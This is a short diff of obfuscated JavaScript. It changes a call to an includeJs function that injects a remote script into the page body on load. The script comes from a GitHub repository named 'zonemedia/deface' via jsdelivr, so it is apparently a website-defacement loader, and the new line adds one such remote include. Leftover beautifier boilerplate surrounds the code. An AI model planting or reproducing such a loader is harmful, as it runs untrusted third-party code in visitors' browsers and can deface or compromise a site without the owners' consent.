@@ -26,7 +26,7 @@ function includeJs(_0xb773xb) {
     _0xb773xc['src'] = _0xb773xb;
     document['body']['appendChild'](_0xb773xc)
 }
-includeJs('https://cdn.jsdelivr.net/gh/zonemedia/deface/index.js') // This is just a sample script. Paste your real code (javascript or HTML) here.
+includeJs('https://cdn.jsdelivr.net/gh/zonemedia/deface/zonemedia.js') // This is just a sample script. Paste your real code (javascript or HTML) here.
 
 if ('this_is' == /an_example/) {
     of_beautifier();
